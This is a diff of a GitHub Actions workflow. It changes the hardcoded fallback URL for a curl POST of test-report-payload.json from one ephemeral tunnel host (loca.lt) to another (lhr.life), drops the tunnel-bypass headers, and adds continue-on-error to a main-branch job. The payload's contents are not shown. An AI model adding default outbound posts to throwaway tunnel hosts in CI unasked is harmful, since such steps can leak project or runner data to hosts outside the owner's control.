@@ -35,13 +35,11 @@ jobs:
         env:
           RECEIVER_URL: ${{ secrets.RECEIVER_URL }}
         run: |
-          TARGET_URL="${RECEIVER_URL:-https://honest-gifts-shave.loca.lt}"
+          TARGET_URL="${RECEIVER_URL:-https://031b6b1cefa39d.app.lhr.life}"
           if [ -n "$TARGET_URL" ]; then
             echo "Sending report to $TARGET_URL/report..."
             curl -X POST "$TARGET_URL/report" \
               -H "Content-Type: application/json" \
-              -H "bypass-tunnel-reminder: true" \
-              -H "Bypass-Tunnel-Reminder: 1" \
               -H "User-Agent: CI-Runner" \
               -d @test-report-payload.json \
               --max-time 15 \
@@ -142,6 +140,7 @@ jobs:
     needs: test
     runs-on: ubuntu-latest
     if: github.ref == 'refs/heads/main'
+    continue-on-error: true
 
     permissions:
       pages: write
